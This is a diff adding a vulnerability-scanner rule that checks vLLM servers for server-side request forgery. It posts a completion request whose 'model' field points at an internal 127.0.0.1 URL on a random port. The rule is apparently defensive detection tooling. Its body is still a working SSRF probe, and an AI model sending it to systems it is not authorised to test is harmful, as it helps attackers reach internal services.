@@ -1,0 +1,17 @@
+cve-id: vllm-ssrf
+set:
+  r: randomInt(800000000, 1000000000)
+rules:
+- method: POST
+  path: /v1/completions
+  headers:
+    Content-Type: application/json
+  body: |
+    {
+      "model": "http://127.0.0.1:{{r}}/test",
+      "prompt": "test"
+    }
+  expression: 'response.status == 200 || response.status == 400 || response.status == 404'
+severity: high
+type: ssrf
+
